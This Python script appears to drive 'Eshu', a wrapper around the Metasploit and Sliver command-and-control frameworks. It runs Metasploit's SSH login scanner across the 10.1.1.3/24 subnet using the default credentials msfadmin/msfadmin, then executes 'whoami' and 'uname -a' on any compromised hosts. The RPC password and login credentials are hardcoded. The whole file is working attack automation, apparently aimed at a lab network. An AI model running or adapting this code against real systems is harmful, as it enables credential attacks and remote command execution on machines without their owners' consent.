import Eshu
from Eshu.c2 import msf, sliver

# Initialize Eshu Instance
e = Eshu.Eshu()

# Set up Metasploit and Sliver instances
password = "memes"
msfInstance = msf.Metasploit(password, e)
#sliverInstance = sliver.Sliver()

# Register Metasploit and Sliver with Eshu
e.register(name="msf", framework=msfInstance)
#e.register(name="sliver", framework=sliverInstance)

#version1:
# msfInstance.run_exploit('auxiliary', 'scanner/ssh/ssh_login')

#version2:
# Extracted Exploit Logic
def run_msf_exploit():
    # Set up exploit details
    mtype = 'auxiliary'
    mname = 'scanner/ssh/ssh_login'
    rhosts = '10.1.1.3/24'
    username = 'msfadmin'
    password = 'msfadmin'
    threads = 5

    # Use the exploit from Metasploit
    exploit = msfInstance.client.modules.use(mtype, mname)
    exploit["RHOSTS"] = rhosts
    exploit["USERNAME"] = username
    exploit["PASSWORD"] = password
    exploit["THREADS"] = threads

    # Execute the exploit
    print(f"Running exploit: {mname} on {rhosts}...")
    result = exploit.execute()
    print("Exploit Result:", result)

    # Wait for scan completion
    if 'job_id' in result and result['job_id'] != 0:
        print("[+] Exploit scan started successfully.")
    else:
        print("[!] Exploit scan failed.")
    return result

exploit_result = run_msf_exploit()

# Retrieve and print hosts
hostSet = e.get_hosts()  # Retrieve all connected hosts across frameworks
print("Hosts =", hostSet)

# Only execute if hostSet is populated when querying "get_hosts"
if hostSet:
    try:
        print("Testing command execution...")
        commands = ["whoami", "uname -a"]
        host_details = {"id": "msf1", "os": "linux"}
        e.run_cmd(commands=commands, **host_details)
    except ValueError as ve:
        print("[!] Error during command execution:", ve)
else:
    print("[!] No hosts available for command execution.")

# Task 3: List all exploit
# # List all exploit modules using the Metasploit instance / Looking for certain exploit
# exploits = msfInstance.list_exploit('exploits')  
# print(f"Available exploits: {len(exploits)}")
# for i, exploit in enumerate(exploits, start=1):
#     print(f" {i}. {exploit['fullname']}")